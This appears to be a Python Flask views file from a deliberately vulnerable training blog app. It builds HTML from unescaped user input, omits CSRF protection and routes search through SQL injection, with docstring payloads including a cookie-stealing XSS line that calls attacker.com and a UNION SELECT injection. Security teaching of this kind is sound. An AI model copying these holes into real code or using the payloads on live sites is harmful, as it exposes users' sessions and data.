"""Blog views

VULNERABILITIES:
- XSS in posts/comments
- SQLi in search
- No CSRF
"""

from flask import Blueprint, request, jsonify, render_template_string
from ..models.post import Post
from ..models.comment import Comment
from ..utils.auth_helper import get_current_user, login_required

blog_bp = Blueprint('blog', __name__)


@blog_bp.route('/')
def index():
    """Home page with recent posts"""
    posts = Post.list_all(limit=10)
    
    # VULN: XSS - rendering unsanitized content
    html = '<html><body><h1>VulnBlog</h1><ul>'
    for post in posts:
        # VULN: XSS - title and content not escaped
        html += f'<li><a href="/posts/{post["id"]}">{post["title"]}</a> by {post["author_name"]}</li>'
    html += '</ul><p><a href="/auth/login">Login</a> | <a href="/posts/create">Create Post</a></p></body></html>'
    
    return render_template_string(html)


@blog_bp.route('/posts/create', methods=['GET', 'POST'])
@login_required
def create_post():
    """VULN: Stored XSS + No CSRF
    CVE Reference: CVE-2021-42053 (Stored XSS)
    
    Exploit: POST title=<script>alert(1)</script> &content=<img src=x onerror=fetch('http://attacker.com/'+document.cookie)>
    """
    if request.method == 'POST':
        user = get_current_user()
        title = request.form.get('title', '')  # VULN: No sanitization
        content = request.form.get('content', '')  # VULN: No sanitization
        
        # VULN: Stored XSS
        post_id = Post.create(title, content, user['id'])
        return jsonify({"success": True, "post_id": post_id})
    
    return render_template_string('''
        <html><body>
        <h2>Create Post</h2>
        <form method="POST">
            Title: <input name="title" size="50"><br>
            Content: <textarea name="content" rows="10" cols="50"></textarea><br>
            <button type="submit">Create</button>
        </form>
        </body></html>
    ''')


@blog_bp.route('/posts/<int:post_id>')
def view_post(post_id):
    """VULN: XSS - displays unsanitized content"""
    post = Post.find_by_id(post_id)
    if not post:
        return "Post not found", 404
    
    comments = Comment.get_by_post(post_id)
    
    # VULN: XSS - rendering unsanitized post content and comments
    html = f'''
        <html><body>
        <h1>{post["title"]}</h1>
        <p>By: {post["author_name"]}</p>
        <div>{post["content"]}</div>
        <hr>
        <h3>Comments:</h3>
        <ul>
    '''
    
    for comment in comments:
        # VULN: XSS in comments
        html += f'<li><b>{comment["author_name"]}:</b> {comment["content"]}</li>'
    
    html += f'''
        </ul>
        <h4>Add Comment:</h4>
        <form method="POST" action="/posts/{post_id}/comment">
            <textarea name="content" rows="3" cols="50"></textarea><br>
            <button type="submit">Submit</button>
        </form>
        <p><a href="/">Back to home</a></p>
        </body></html>
    '''
    
    return render_template_string(html)


@blog_bp.route('/posts/<int:post_id>/comment', methods=['POST'])
@login_required
def add_comment(post_id):
    """VULN: Stored XSS + No CSRF
    CVE Reference: CVE-2021-42053 (Stored XSS)
    
    Exploit: POST content=<script>alert(document.cookie)</script>
    """
    user = get_current_user()
    content = request.form.get('content', '')  # VULN: No sanitization
    
    # VULN: Stored XSS
    Comment.create(post_id, user['id'], content)
    return jsonify({"success": True})


@blog_bp.route('/search')
def search():
    """VULN: SQL Injection in search
    
    Exploit: /search?q=' UNION SELECT 1,2,3,4,5--
    """
    keyword = request.args.get('q', '')
    
    # VULN: SQL Injection via Post.search
    posts = Post.search(keyword)
    
    html = f'<html><body><h2>Search Results for: {keyword}</h2><ul>'
    for post in posts:
        html += f'<li><a href="/posts/{post["id"]}">{post["title"]}</a></li>'
    html += '</ul><p><a href="/">Back</a></p></body></html>'
    
    return render_template_string(html)
